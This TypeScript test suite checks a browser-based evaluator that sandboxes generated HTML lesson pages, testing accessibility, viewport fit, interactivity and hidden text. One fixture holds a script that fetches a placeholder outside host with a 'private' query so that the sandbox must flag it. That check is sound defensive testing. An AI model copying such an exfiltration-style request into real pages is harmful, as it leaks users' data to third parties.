import assert from "node:assert/strict";
import test from "node:test";
import { evaluateHtmlInBrowser } from "./evaluate";

const goodFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Browser evaluator fixture</title><style>*{box-sizing:border-box}body{font:16px system-ui;margin:0}main{max-width:40rem;margin:auto;padding:16px}button{min-width:120px;min-height:48px;font:inherit}</style></head><body><main><h1>Browser evaluator fixture</h1><button id="check" type="button">Check answer</button><p id="feedback" aria-live="polite"></p></main><script>document.getElementById('check').addEventListener('click',()=>{document.getElementById('feedback').textContent='Correct';document.body.dataset.checked='yes'})</script></body></html>`;

const badFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Bad fixture</title><style>body{width:1400px;font-size:10px}button{width:20px;height:20px}</style></head><body><main><h1>Bad fixture</h1><button id="same"></button><button id="same">B</button><img src="assets/example"><script>fetch('https://example.invalid/student?q=private').catch(()=>{});setTimeout(()=>{throw new Error('private content')},75)</script></main></body></html>`;
const inertFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Inert fixture</title><style>body{font:16px system-ui}button{min-width:120px;min-height:48px}</style></head><body><main><h1>Inert fixture</h1><button type="button">Does nothing</button></main></body></html>`;
const nativeStateFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Native state fixture</title><style>body{font:16px system-ui}input{width:44px;height:44px}</style></head><body><main><h1>Native state fixture</h1><label><input type="checkbox"> Ready</label></main></body></html>`;
const delayedFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Delayed fixture</title><style>body{font:16px system-ui}button{min-width:120px;min-height:48px}</style></head><body><main><h1>Delayed fixture</h1><button id="check" type="button">Check</button><p id="feedback" aria-live="polite"></p></main><script>check.onclick=()=>setTimeout(()=>{feedback.textContent='Ready';document.body.dataset.ready='yes'},75)</script></body></html>`;
const mixedFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Mixed fixture</title><style>body{font:16px system-ui}button{min-width:120px;min-height:48px}</style></head><body><main><h1>Mixed fixture</h1><button id="works" type="button">Works</button><button type="button">Inert one</button><button type="button">Inert two</button><button type="button">Inert three</button><button type="button">Inert four</button></main><script>const workingButton=document.getElementById('works');workingButton.onclick=()=>{workingButton.textContent='Changed'}</script></body></html>`;
const hiddenTextFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Hidden text fixture</title><style>body{font:16px system-ui}</style></head><body><main><h1>Hidden text fixture</h1><p>Visible lesson text</p></main><script>const hiddenContractTerm='fraction';</script></body></html>`;
const visuallyHiddenTextFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Visually hidden text fixture</title><style>body{font:16px system-ui}.hidden{opacity:0;position:fixed;left:-9999px}</style></head><body><main><h1>Visually hidden text fixture</h1><p>Visible lesson text</p><span class="hidden">fraction</span></main></body></html>`;
const windowNameFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Window name fixture</title><style>body{font:16px system-ui}button{min-width:120px;min-height:48px}</style></head><body><main><h1>Window name fixture</h1><button id="remember" type="button">Remember</button></main><script>if(window.name==='remembered')document.body.dataset.inherited='yes';document.getElementById('remember').onclick=()=>{window.name='remembered';document.getElementById('remember').textContent='Remembered'}</script></body></html>`;
const sameOriginFetchFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Same-origin fetch fixture</title><style>body{font:16px system-ui}</style></head><body><main><h1>Same-origin fetch fixture</h1></main><script>fetch('/').catch(()=>{})</script></body></html>`;
const unreachableFixture = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Unreachable fixture</title><style>html,body{height:100%;overflow:hidden}body{font:16px system-ui}button{position:fixed;top:900px;min-width:120px;min-height:48px}</style></head><body><main><h1>Unreachable fixture</h1><button type="button" onclick="this.textContent='Changed'">Unreachable</button></main></body></html>`;

test("browser evaluator executes deterministic interactions without retaining source", async () => {
  const result = await evaluateHtmlInBrowser(goodFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [{
      name: "check answer",
      actions: [{ type: "click", selector: "#check" }],
      assertions: [
        { selector: "#feedback", textIncludes: "Correct" },
        { selector: "body", attribute: { name: "data-checked", value: "yes" } },
      ],
    }],
  });

  assert.equal(result.passed, true);
  assert.equal(result.viewports[0]?.behavior.scenarios[0]?.passed, true);
  assert.equal(result.viewports[0]?.behavior.scenarios[0]?.stateChanged, true);
  assert.doesNotMatch(JSON.stringify(result), /Browser evaluator fixture|Correct/);
});

test("browser evaluator reports sandbox, accessibility, viewport, and runtime failures as metadata", async () => {
  const result = await evaluateHtmlInBrowser(badFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });
  const viewport = result.viewports[0]!;

  assert.equal(result.passed, false);
  assert.equal(viewport.sandbox.passed, false);
  assert.ok(viewport.sandbox.cspViolationCount > 0);
  assert.equal(viewport.accessibilityBasic.passed, false);
  assert.ok(viewport.accessibilityBasic.duplicateIdCount > 0);
  assert.ok(viewport.accessibilityBasic.imageMissingAltCount > 0);
  assert.equal(viewport.viewportFit.passed, false);
  assert.ok(viewport.viewportFit.horizontalOverflowPixels > 0);
  assert.ok(viewport.behavior.pageErrorCount > 0);
  assert.equal(viewport.renderedQuality.passed, false);
  assert.doesNotMatch(JSON.stringify(result), /private content|student\?q/);
});

test("browser evaluator rejects inert controls and observes bounded delayed behavior", async () => {
  const inert = await evaluateHtmlInBrowser(inertFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });
  assert.equal(inert.viewports[0]?.behavior.changedControlCount, 0);
  assert.equal(inert.viewports[0]?.behavior.passed, false);

  const nativeState = await evaluateHtmlInBrowser(nativeStateFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });
  assert.equal(nativeState.viewports[0]?.behavior.changedControlCount, 1);
  assert.equal(nativeState.viewports[0]?.behavior.passed, true);

  const delayed = await evaluateHtmlInBrowser(delayedFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [{
      name: "delayed feedback",
      actions: [{ type: "click", selector: "#check" }],
      assertions: [
        { selector: "#feedback", textIncludes: "Ready" },
        { selector: "body", attribute: { name: "data-ready", value: "yes" } },
      ],
    }],
  });
  assert.equal(delayed.viewports[0]?.behavior.scenarios[0]?.passed, true);
  assert.equal(delayed.viewports[0]?.behavior.scenarios[0]?.stateChanged, true);
  assert.equal(delayed.viewports[0]?.behavior.changedControlCount, 1);
  assert.equal(delayed.viewports[0]?.behavior.passed, true);
});

test("browser evaluator isolates controls and requires most exercised controls to change", async () => {
  const result = await evaluateHtmlInBrowser(mixedFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });

  assert.equal(result.viewports[0]?.behavior.exercisedControlCount, 5);
  assert.equal(result.viewports[0]?.behavior.changedControlCount, 1);
  assert.equal(result.viewports[0]?.behavior.interactionPassRate, 0.2);
  assert.equal(result.viewports[0]?.behavior.passed, false);
});

test("browser evaluator resets declarative scenarios and checks rendered text", async () => {
  const isolated = await evaluateHtmlInBrowser(goodFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [
      {
        name: "mutate the page",
        actions: [{ type: "click", selector: "#check" }],
        assertions: [{ selector: "body", attribute: { name: "data-checked", value: "yes" } }],
      },
      {
        name: "must not inherit prior state",
        actions: [],
        assertions: [{ selector: "body", attribute: { name: "data-checked", value: "yes" } }],
      },
    ],
  });
  assert.equal(isolated.viewports[0]?.behavior.scenarios[0]?.passed, true);
  assert.equal(isolated.viewports[0]?.behavior.scenarios[1]?.passed, false);

  const renderedText = await evaluateHtmlInBrowser(hiddenTextFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [{
      name: "visible content",
      actions: [],
      assertions: [{ selector: "body", textIncludes: "fraction" }],
    }],
  });
  assert.equal(renderedText.viewports[0]?.behavior.scenarios[0]?.passed, false);

  const visuallyHiddenText = await evaluateHtmlInBrowser(visuallyHiddenTextFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [{
      name: "visually hidden content",
      actions: [],
      assertions: [{ selector: "body", textIncludes: "fraction", visible: true }],
    }],
  });
  assert.equal(visuallyHiddenText.viewports[0]?.behavior.scenarios[0]?.passed, false);

  const browsingContext = await evaluateHtmlInBrowser(windowNameFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
    scenarios: [
      {
        name: "set browsing-context state",
        actions: [{ type: "click", selector: "#remember" }],
        assertions: [],
      },
      {
        name: "must use a fresh browsing context",
        actions: [],
        assertions: [{ selector: "body", attribute: { name: "data-inherited", value: "yes" } }],
      },
    ],
  });
  assert.equal(browsingContext.viewports[0]?.behavior.scenarios[0]?.passed, true);
  assert.equal(browsingContext.viewports[0]?.behavior.scenarios[1]?.passed, false);
});

test("browser evaluator blocks same-origin API-shaped requests and rejects unreachable controls", async () => {
  const network = await evaluateHtmlInBrowser(sameOriginFetchFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });
  assert.equal(network.viewports[0]?.sandbox.passed, false);
  assert.ok((network.viewports[0]?.sandbox.sameOriginUnexpectedRequestCount ?? 0) > 0);

  const unreachable = await evaluateHtmlInBrowser(unreachableFixture, {
    viewports: [{ name: "phone", width: 390, height: 844 }],
  });
  assert.equal(unreachable.viewports[0]?.viewportFit.controlsOutsideInitialViewport, 1);
  assert.ok((unreachable.viewports[0]?.behavior.interactionErrorCount ?? 0) > 0);
  assert.equal(unreachable.viewports[0]?.behavior.passed, false);
  assert.equal(unreachable.passed, false);
});
